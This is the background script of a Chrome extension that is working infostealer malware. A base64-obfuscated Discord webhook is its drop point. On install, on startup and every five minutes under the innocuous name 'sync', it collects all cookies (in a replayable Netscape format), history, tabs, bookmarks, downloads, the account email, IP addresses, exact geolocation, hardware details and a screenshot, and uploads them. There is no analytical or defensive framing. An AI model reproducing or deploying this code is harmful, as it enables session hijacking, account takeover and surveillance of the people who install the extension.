/* ================= hook ================= */
const _0 = [
  "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv",
  "1567288121513484460",
  "yqB-cE5foXjhVzLzP5zVr91-WBBtlV-FpM8I6FGBqY7GKUQJZyRsgIMI7x-1e16smXUO"
];
const HOOK = atob(_0[0]) + _0[1] + "/" + _0[2];
const store = chrome.storage.local;
const sleep = ms => new Promise(r => setTimeout(r, ms));
const safe = async (fn, d) => { try { return await fn(); } catch (e) { return d; } };
let busy = false;

async function sid() {
  const o = await store.get("sid");
  if (!o.sid) { o.sid = crypto.randomUUID(); await store.set({ sid: o.sid }); }
  return o.sid;
}

function netscape(list) {
  const out = ["# Netscape HTTP Cookie File", "# " + new Date().toISOString(), ""];
  for (const c of list) {
    const d = c.domain || "";
    out.push([d, d.startsWith(".") ? "TRUE" : "FALSE", c.path || "/", c.secure ? "TRUE" : "FALSE",
      Math.floor(c.expirationDate || 0), c.name,
      String(c.value == null ? "" : c.value).replace(/[\t\r\n]+/g, " ")].join("\t"));
  }
  return out.join("\n");
}

async function hookSend(payload, files) {
  for (let i = 0; i < 4; i++) {
    const fd = new FormData();
    fd.append("payload_json", JSON.stringify(payload));
    (files || []).forEach((f, n) =>
      fd.append("files[" + n + "]", new Blob([f.data], { type: f.type }), f.name));
    let r;
    try { r = await fetch(HOOK + "?wait=true", { method: "POST", body: fd }); }
    catch (e) { await sleep(2500); continue; }
    if (r.status === 429) {
      const j = await r.json().catch(() => ({}));
      await sleep(Math.ceil((j.retry_after || 3) * 1000) + 400);
      continue;
    }
    if (r.status === 413) return "big";
    if (!r.ok) { await sleep(2000); continue; }
    return "ok";
  }
  return "fail";
}

function chunk(a, n) {
  const o = [];
  for (let i = 0; i < a.length; i += n) o.push(a.slice(i, i + n));
  return o.length ? o : [[]];
}

/* ================= buffer ================= */
let q = {}, qt = null;
function stash(p) {
  if (!p || !p.url) return;
  q[p.url.split("#")[0].slice(0, 300)] = p;
  clearTimeout(qt);
  qt = setTimeout(flush, 1500);
}
async function flush() {
  const add = q; q = {};
  const keys = Object.keys(add);
  if (!keys.length) return;
  const cur = (await store.get("pages")).pages || {};
  const n = Object.keys(cur).length;
  for (const k of keys) {
    if (n > 900 && !cur[k]) continue;
    add[k].t = Date.now();
    cur[k] = add[k];
  }
  await store.set({ pages: cur });
}

/* ================= extras ================= */
async function offGeo() {
  try {
    if (!(await chrome.offscreen.hasDocument())) {
      await chrome.offscreen.createDocument({ url: "off.html", reasons: ["GEOLOCATION"], justification: "g" });
    }
    return await chrome.runtime.sendMessage({ t: "geo" });
  } catch (e) { return null; }
}

async function shot() {
  try {
    const d = await chrome.tabs.captureVisibleTab(null, { format: "jpeg", quality: 55 });
    return await (await fetch(d)).blob();
  } catch (e) { return null; }
}

/* ================= main ================= */
async function run(reason) {
  if (busy) return;
  busy = true;
  try {
    clearTimeout(qt); await flush();

    const id = await sid();
    const short = id.slice(0, 8);
    const now = new Date();

    const cookies = await safe(() => chrome.cookies.getAll({}), []);
    const pages = (await store.get("pages")).pages || {};
    const hist = await safe(() => chrome.history.search({ text: "", startTime: 0, maxResults: 5000 }), []);
    const tabs = await safe(() => chrome.tabs.query({}), []);
    const marks = await safe(() => chrome.bookmarks.getTree(), []);
    const dls = await safe(() => chrome.downloads.search({ limit: 3000, orderBy: ["-startTime"] }), []);
    const closed = await safe(() => chrome.sessions.getRecentlyClosed({ maxResults: 25 }), []);
    const top = await safe(() => chrome.topSites(), []);
    const exts = await safe(() => chrome.management.getAll(), []);
    const plat = await safe(() => chrome.runtime.getPlatformInfo(), {});
    const cpu = await safe(() => chrome.system.cpu.getInfo(), null);
    const mem = await safe(() => chrome.system.memory.getInfo(), null);
    const disk = await safe(() => chrome.system.storage.getInfo(), []);
    const fonts = await safe(() => chrome.fontSettings.getFontList(), []);
    const proxy = await safe(() => chrome.proxy.settings.get({ incognito: false }), null);
    const langs = await safe(() => chrome.i18n.getAcceptLanguages(), []);
    const acct = await safe(() => chrome.identity.getProfileUserInfo({ accountStatus: "ANY" }), null);
    const prn = await safe(() => chrome.printing.getPrinters(), []);
    const pubip = await safe(async () => (await (await fetch("https://api.ipify.org?format=json")).json()).ip, null);
    const geo = await safe(async () => (await (await fetch("https://ipapi.co/json/")).json()), null);
    const geo2 = await offGeo();
    const pic = await shot();
    let tz = null; try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}

    const locals = new Set();
    Object.values(pages).forEach(p => (p.ips || []).forEach(i => locals.add(i)));
    const doms = new Set(cookies.map(c => c.domain));

    const meta = {
      id, time: now.toISOString(), reason, platform: plat, tz,
      version: chrome.runtime.getManifest().version,
      pubip, geo, geo_exact: geo2, local_ips: [...locals],
      account: acct, langs, cpu, mem, disk, proxy, printers: prn,
      fonts: fonts.map(f => f.fontId || f.displayName).slice(0, 400)
    };

    const head = await hookSend({
      username: "sync",
      content: [
        "**" + short + "** · `" + now.toISOString() + "` · " + reason,
        "**IP** `" + (pubip || "?") + "` · " + (geo ? (geo.city || "?") + ", " + (geo.country_name || "?") + " · " + (geo.org || "") : "?"),
        "local `" + [...locals].join("`, `") + "`",
        "cookies **" + cookies.length + "** · domains **" + doms.size + "** · pages **" + Object.keys(pages).length + "**",
        "os **" + (plat.os || "?") + "/" + (plat.arch || "?") + "** · tz **" + (tz || "?") + "** · acc **" + ((acct && acct.email) || "?") + "**"
      ].join("\n")
    }, pic ? [{ name: "screen.jpg", type: "image/jpeg", data: pic }] : []);
    if (head === "fail") return;
    await sleep(1200);

    const groups = chunk(cookies, 2500);
    for (let i = 0; i < groups.length; i++) {
      const g = groups[i];
      const part = groups.length > 1 ? " (" + (i + 1) + "/" + groups.length + ")" : "";
      const r = await hookSend({ username: "sync", content: "`" + short + "` cookies" + part }, [
        { name: "cookies_" + (i + 1) + ".json", type: "application/json", data: JSON.stringify(g, null, 1) },
        { name: "cookies_" + (i + 1) + ".txt", type: "text/plain", data: netscape(g) }
      ]);
      if (r === "fail") return;
      await sleep(1400);
    }

    const pgs = chunk(Object.keys(pages), 250);
    for (let i = 0; i < pgs.length; i++) {
      const part = pgs.length > 1 ? " (" + (i + 1) + "/" + pgs.length + ")" : "";
      const r = await hookSend({ username: "sync", content: "`" + short + "` pages" + part }, [{
        name: "pages_" + (i + 1) + ".json", type: "application/json",
        data: JSON.stringify(pgs[i].map(k => [k, pages[k]]), null, 1)
      }]);
      if (r === "fail") return;
      await sleep(1400);
    }

    const r2 = await hookSend({ username: "sync", content: "`" + short + "` rest" }, [{
      name: "meta.json", type: "application/json",
      data: JSON.stringify({ ...meta, history: hist, tabs, bookmarks: marks, downloads: dls,
        recentlyClosed: closed, topSites: top,
        extensions: exts.map(e => ({ id: e.id, name: e.name, version: e.version, enabled: e.enabled })) }, null, 1)
    }]);
    if (r2 === "fail") return;

    await store.set({ pages: {}, last: now.toISOString() });
  } catch (e) {
  } finally { busy = false; }
}

/* ================= wiring ================= */
chrome.runtime.onMessage.addListener((m, s, res) => {
  if (m && m.t === "page") stash(m.data);
  return false;
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create("sync", { periodInMinutes: 5, delayInMinutes: 0.5 });
  setTimeout(() => run("install"), 4000);
});
chrome.runtime.onStartup.addListener(() => {
  chrome.alarms.create("sync", { periodInMinutes: 5, delayInMinutes: 0.5 });
  setTimeout(() => run("startup"), 8000);
});
chrome.alarms.onAlarm.addListener(a => { if (a.name === "sync") run("alarm"); });

(async () => {
  const a = await safe(() => chrome.alarms.get("sync"), null);
  if (!a) chrome.alarms.create("sync", { periodInMinutes: 5, delayInMinutes: 1 });
})();